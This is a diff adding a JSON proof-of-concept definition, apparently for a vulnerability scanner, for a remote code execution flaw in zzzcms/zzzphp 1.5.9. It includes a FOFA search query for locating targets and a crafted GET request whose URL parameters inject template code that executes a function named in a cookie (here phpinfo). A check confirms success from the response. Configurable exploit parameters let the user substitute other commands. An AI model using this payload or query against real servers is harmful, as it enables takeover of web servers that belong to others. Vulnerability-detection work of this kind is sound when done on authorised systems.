@@ -1,0 +1,86 @@
+{
+  "Name": "POCID5971 zzzphp 1.5.9 front code execution",
+  "Description": "The front code execution of the latest version 1.5.9 of the zzzphp system may cause an attacker to arbitrarily execute code on the server side, thereby controlling the entire web server.",
+  "Product": "zzzcms",
+  "Homepage": "http://www.zzzcms.com",
+  "DisclosureDate": "2020-09-03",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"zzzcms\"",
+  "Level": "3",
+  "Impact": "可能导致攻击者在服务器端任意执行代码，进而控制整个web服务器。",
+  "Recommendation": "<p>1、始终对变量初始化。</p><p>2、使用此类函数时，严格检查输入的参数值，尽量避免使用此类函数。</p><p>3、升级至最新版本：<a href=\"http://www.zzzcms.com\" target=\"_blank\">http://www.zzzcms.com</a></p>",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+	{
+      "Name": "urlCmd",
+      "Type": "input",
+      "Value": "{if:$_COOKIE['acv']()}__();{end+if}"
+    },
+	{
+      "Name": "parseCmd",
+      "Type": "input",
+      "Value": "phpinfo"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "GET",
+		"header": {
+			"Cookie": "zzz_keys=123; acv=phpinfo"
+		},
+        "uri": "/index.php?location=user&act=login&type={if:$_COOKIE['acv']()}$_COOKIE[acv](){end+if}&backurl={if:$_COOKIE['acv']()}$_COOKIE[acv](){end+if}"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+		{
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "PHP Version",
+            "variable": "$body"
+          },
+		{
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "PHP Extension",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["zzzcms"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": true
+}
